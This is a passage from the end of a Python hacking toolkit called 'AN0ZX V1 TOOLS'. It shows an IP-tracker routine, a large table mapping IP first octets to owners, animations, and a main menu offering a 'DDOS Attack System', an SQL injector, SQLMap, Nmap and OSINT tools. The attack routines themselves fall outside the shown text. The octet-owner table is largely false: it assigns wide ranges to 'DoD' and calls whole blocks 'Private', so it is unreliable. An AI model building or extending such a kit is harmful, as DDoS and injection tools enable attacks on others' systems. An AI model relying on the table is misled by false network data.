                "2": "RIPE NCC",
                "3": "General Electric",
                "4": "Level 3",
                "5": "RIPE NCC",
                "6": "US Army",
                "7": "DoD Network",
                "8": "Level 3",
                "9": "IBM",
                "11": "DoD Intel",
                "12": "AT&T",
                "13": "Xerox",
                "14": "APNIC",
                "15": "HP",
                "16": "Digital Equipment",
                "17": "Apple",
                "18": "MIT",
                "19": "Ford Motor",
                "20": "Computer Sciences",
                "21": "DoD",
                "22": "DoD",
                "23": "DoD",
                "24": "DoD",
                "25": "UK Ministry",
                "26": "DoD",
                "27": "APNIC",
                "28": "DoD",
                "29": "DoD",
                "30": "DoD",
                "31": "RIPE NCC",
                "32": "AT&T",
                "33": "DoD",
                "34": "DoD",
                "35": "DoD",
                "36": "APNIC",
                "37": "RIPE NCC",
                "38": "PSINet",
                "39": "APNIC",
                "40": "Eli Lilly",
                "41": "AFRINIC",
                "42": "APNIC",
                "43": "APNIC",
                "44": "Amateur Radio",
                "45": "APNIC",
                "46": "RIPE NCC",
                "47": "Bell Northern",
                "48": "Prudential",
                "49": "APNIC",
                "50": "DoD",
                "51": "DoD",
                "52": "DoD",
                "53": "DoD",
                "54": "Amazon",
                "55": "DoD",
                "56": "US Postal",
                "57": "SITA",
                "58": "APNIC",
                "59": "APNIC",
                "60": "APNIC",
                "61": "APNIC",
                "62": "RIPE NCC",
                "63": "DoD",
                "64": "DoD",
                "65": "DoD",
                "66": "DoD",
                "67": "DoD",
                "68": "DoD",
                "69": "DoD",
                "70": "DoD",
                "71": "DoD",
                "72": "DoD",
                "73": "DoD",
                "74": "DoD",
                "75": "DoD",
                "76": "DoD",
                "77": "RIPE NCC",
                "78": "RIPE NCC",
                "79": "RIPE NCC",
                "80": "RIPE NCC",
                "81": "RIPE NCC",
                "82": "RIPE NCC",
                "83": "RIPE NCC",
                "84": "RIPE NCC",
                "85": "RIPE NCC",
                "86": "RIPE NCC",
                "87": "RIPE NCC",
                "88": "RIPE NCC",
                "89": "RIPE NCC",
                "90": "RIPE NCC",
                "91": "RIPE NCC",
                "92": "RIPE NCC",
                "93": "RIPE NCC",
                "94": "RIPE NCC",
                "95": "RIPE NCC",
                "96": "DoD",
                "97": "DoD",
                "98": "DoD",
                "99": "DoD",
                "100": "DoD",
                "101": "APNIC",
                "102": "AFRINIC",
                "103": "APNIC",
                "104": "DoD",
                "105": "AFRINIC",
                "106": "APNIC",
                "107": "DoD",
                "108": "AT&T",
                "109": "RIPE NCC",
                "110": "APNIC",
                "111": "APNIC",
                "112": "APNIC",
                "113": "APNIC",
                "114": "APNIC",
                "115": "APNIC",
                "116": "APNIC",
                "117": "APNIC",
                "118": "APNIC",
                "119": "APNIC",
                "120": "APNIC",
                "121": "APNIC",
                "122": "APNIC",
                "123": "APNIC",
                "124": "APNIC",
                "125": "APNIC",
                "126": "APNIC",
                "127": "Loopback",
                "128": "DoD",
                "129": "DoD",
                "130": "DoD",
                "131": "DoD",
                "132": "DoD",
                "133": "DoD",
                "134": "DoD",
                "135": "DoD",
                "136": "DoD",
                "137": "DoD",
                "138": "DoD",
                "139": "DoD",
                "140": "DoD",
                "141": "DoD",
                "142": "DoD",
                "143": "DoD",
                "144": "DoD",
                "145": "DoD",
                "146": "DoD",
                "147": "DoD",
                "148": "DoD",
                "149": "DoD",
                "150": "DoD",
                "151": "RIPE NCC",
                "152": "DoD",
                "153": "DoD",
                "154": "AFRINIC",
                "155": "DoD",
                "156": "DoD",
                "157": "DoD",
                "158": "DoD",
                "159": "DoD",
                "160": "DoD",
                "161": "DoD",
                "162": "DoD",
                "163": "APNIC",
                "164": "DoD",
                "165": "DoD",
                "166": "DoD",
                "167": "DoD",
                "168": "DoD",
                "169": "DoD",
                "170": "DoD",
                "171": "APNIC",
                "172": "Private",
                "173": "DoD",
                "174": "DoD",
                "175": "APNIC",
                "176": "RIPE NCC",
                "177": "LACNIC",
                "178": "RIPE NCC",
                "179": "LACNIC",
                "180": "APNIC",
                "181": "LACNIC",
                "182": "APNIC",
                "183": "APNIC",
                "184": "DoD",
                "185": "RIPE NCC",
                "186": "LACNIC",
                "187": "LACNIC",
                "188": "RIPE NCC",
                "189": "LACNIC",
                "190": "LACNIC",
                "191": "LACNIC",
                "192": "Private",
                "193": "RIPE NCC",
                "194": "RIPE NCC",
                "195": "RIPE NCC",
                "196": "DoD",
                "197": "RIPE NCC",
                "198": "DoD",
                "199": "ARIN",
                "200": "LACNIC",
                "201": "LACNIC",
                "202": "APNIC",
                "203": "APNIC",
                "204": "ARIN",
                "205": "ARIN",
                "206": "ARIN",
                "207": "ARIN",
                "208": "ARIN",
                "209": "ARIN",
                "210": "APNIC",
                "211": "APNIC",
                "212": "RIPE NCC",
                "213": "RIPE NCC",
                "214": "DoD",
                "215": "DoD",
                "216": "ARIN",
                "217": "RIPE NCC",
                "218": "APNIC",
                "219": "APNIC",
                "220": "APNIC",
                "221": "APNIC",
                "222": "APNIC",
                "223": "APNIC",
                "224": "Multicast",
                "225": "Multicast",
                "226": "Multicast",
                "227": "Multicast",
                "228": "Multicast",
                "229": "Multicast",
                "230": "Multicast",
                "231": "Multicast",
                "232": "Multicast",
                "233": "Multicast",
                "234": "Multicast",
                "235": "Multicast",
                "236": "Multicast",
                "237": "Multicast",
                "238": "Multicast",
                "239": "Multicast",
                "240": "Reserved",
                "241": "Reserved",
                "242": "Reserved",
                "243": "Reserved",
                "244": "Reserved",
                "245": "Reserved",
                "246": "Reserved",
                "247": "Reserved",
                "248": "Reserved",
                "249": "Reserved",
                "250": "Reserved",
                "251": "Reserved",
                "252": "Reserved",
                "253": "Reserved",
                "254": "Reserved",
                "255": "Reserved"
            }
            
            if first_octet in ip_ranges:
                dns_results["IP Range Owner"] = ip_ranges[first_octet]
            else:
                dns_results["IP Range Owner"] = "Unknown"
        
        # Display DNS results
        print(Fore.CYAN + "\n[+] DNS Information:")
        for key, value in dns_results.items():
            print(Fore.YELLOW + f"    • {key}: {value}")
            
    except Exception as e:
        print(Fore.RED + f"    • DNS lookup failed: {str(e)}")
    
    # Generate map URL
    if 'lat' in ip_data and 'lon' in ip_data:
        map_url = f"https://maps.google.com/?q={ip_data['lat']},{ip_data['lon']}"
        print(Fore.CYAN + f"\n[+] Google Maps: {Fore.YELLOW}{map_url}")
    
    # Save results to file
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ip_tracker_{ip.replace('.', '_')}_{timestamp}.txt"
    
    with open(filename, 'w') as f:
        f.write(f"IP Tracker Report\n")
        f.write(f"IP Address: {ip}\n")
        f.write(f"Date: {datetime.datetime.now()}\n")
        f.write("="*50 + "\n\n")
        
        f.write("GEO LOCATION DATA:\n")
        for key in ['country', 'region', 'city', 'zip', 'lat', 'lon', 'isp', 'org', 'as']:
            if key in ip_data and ip_data[key]:
                f.write(f"{key.upper()}: {ip_data[key]}\n")
        
        f.write("\nADDITIONAL INFORMATION:\n")
        f.write(f"IP Version: {'IPv4' if '.' in ip else 'IPv6'}\n")
        f.write(f"Public IP: {'Yes' if not ipaddress.ip_address(ip).is_private else 'No'}\n")
        
        if 'source' in ip_data:
            f.write(f"Data Source: {ip_data['source']}\n")
    
    print(Fore.GREEN + f"\n[✓] Report saved to: {filename}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def get_mock_ip_data(ip):
    """Generate mock IP data for demonstration"""
    # This is for demonstration only
    mock_data = {
        "country": "United States",
        "region": "California",
        "city": "Mountain View",
        "zip": "94043",
        "lat": "37.4056",
        "lon": "-122.0775",
        "isp": "Google LLC",
        "org": "Google",
        "as": "AS15169 Google LLC",
        "source": "Offline Database"
    }
    
    # Modify based on IP pattern
    if ip.startswith("8.8."):
        mock_data.update({
            "city": "Mountain View",
            "isp": "Google LLC",
            "org": "Google Public DNS"
        })
    elif ip.startswith("1.1."):
        mock_data.update({
            "country": "United States",
            "city": "Los Angeles",
            "isp": "Cloudflare",
            "org": "Cloudflare DNS"
        })
    
    return mock_data

# Goodbye animation
def goodbye_animation():
    """Goodbye animation with typing effect"""
    clear_screen()
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    
    goodbye_text = "Dadah sampai jumpa.."
    
    for i in range(len(goodbye_text) + 10):
        clear_screen()
        current_text = goodbye_text[:i] if i <= len(goodbye_text) else goodbye_text
        color = colors[i % len(colors)]
        print(color + " " * 20 + current_text)
        time.sleep(0.1)
    
    time.sleep(1)
    
    # Final message
    print(Fore.CYAN + "\n" + "=" * 70)
    print(Fore.GREEN + "AN0ZX V1 TOOLS - Professional Security Toolkit")
    print(Fore.YELLOW + "Creator: mrzxx (@Zxxtirwd) & AN0MALIXPLOIT (@An0maliXGR)")
    print(Fore.CYAN + "=" * 70)
    time.sleep(2)

# Main program
def main():
    """Main program entry point"""
    try:
        # Show welcome animation
        welcome_animation()
        
        # Login
        username = login()
        if not username:
            return
        
        # Main program loop
        while True:
            show_main_menu(username)
            
            choice = input(Fore.CYAN + "\n[?] Select option (1-6): " + Fore.WHITE).strip()
            
            if choice == "1":
                typing_effect("\nEntering DDOS Attack System...")
                ddos_menu()
            elif choice == "2":
                typing_effect("\nEntering SQL Injector...")
                sql_injector_menu()
            elif choice == "3":
                typing_effect("\nEntering SQLMap Tool...")
                target = input(Fore.CYAN + "[?] Target URL for SQLMap: " + Fore.WHITE).strip()
                if target:
                    run_sqlmap_tool(target)
            elif choice == "4":
                typing_effect("\nEntering NMap Tool...")
                nmap_menu()
            elif choice == "5":
                typing_effect("\nEntering OSINT Tools...")
                osint_menu()
            elif choice == "6":
                goodbye_animation()
                break
            else:
                print(Fore.RED + "[✗] Invalid choice!")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[✗] Program interrupted!")
        goodbye_animation()
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
        input(Fore.YELLOW + "\n[?] Press Enter to exit...")

if __name__ == "__main__":
    # Check requirements
    try:
        import colorama
        import requests
    except ImportError:
        print(Fore.RED + "[!] Installing required packages...")
        os.system("pip install colorama requests > /dev/null 2>&1")
        print(Fore.GREEN + "[✓] Requirements installed!")
        time.sleep(2)
    
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + "AN0ZX V1 TOOLS - Professional Security Toolkit")
    print(Fore.GREEN + "Licensed Version - Contact @Zxxtirwd for account")
    print(Fore.CYAN + "=" * 70)
    time.sleep(2)
    
    main()
